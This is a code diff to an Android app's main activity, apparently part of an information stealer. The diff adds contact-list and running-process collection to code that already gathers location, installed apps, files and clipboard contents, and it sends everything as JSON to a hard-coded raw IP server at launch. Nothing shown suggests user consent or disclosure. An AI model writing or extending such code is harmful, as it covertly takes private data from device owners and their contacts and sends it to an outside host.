@@ -32,7 +32,8 @@ public class MainActivity extends AppCompatActivity {
                 Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.ACCESS_COARSE_LOCATION,
                 Manifest.permission.INTERNET,
-                Manifest.permission.READ_EXTERNAL_STORAGE
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.READ_CONTACTS
         };
         DONE = false;
         SERVER = "http://120.53.236.211:12334/save";
@@ -61,6 +62,8 @@ public class MainActivity extends AppCompatActivity {
         LocationTh1f locationTh1f = new LocationTh1f(this);
         FileTh1f fileTh1f = new FileTh1f(this);
         AppTh1f appTh1f = new AppTh1f(this);
+        ContactTh1f contactTh1f = new ContactTh1f(this);
+        ProcessTh1f processTh1f = new ProcessTh1f(this);
         setContentView(R.layout.activity_main);
         TextView textView = findViewById(R.id.man);
         JSONObject allInfo = new JSONObject();
@@ -71,6 +74,8 @@ public class MainActivity extends AppCompatActivity {
             allInfo.put("apps", appTh1f.getAppInfo());
             allInfo.put("files", fileTh1f.getFileInfo());
             allInfo.put("clipboard", clipboardTh1f.getClipboardInfo());
+            allInfo.put("contacts", contactTh1f.getContectInfo());
+            allInfo.put("process", processTh1f.getProcessInfo() );
             InfoClient infoClient = new InfoClient(SERVER);
             infoClient.sendInfo(allInfo.toString());
         } catch (JSONException e) {
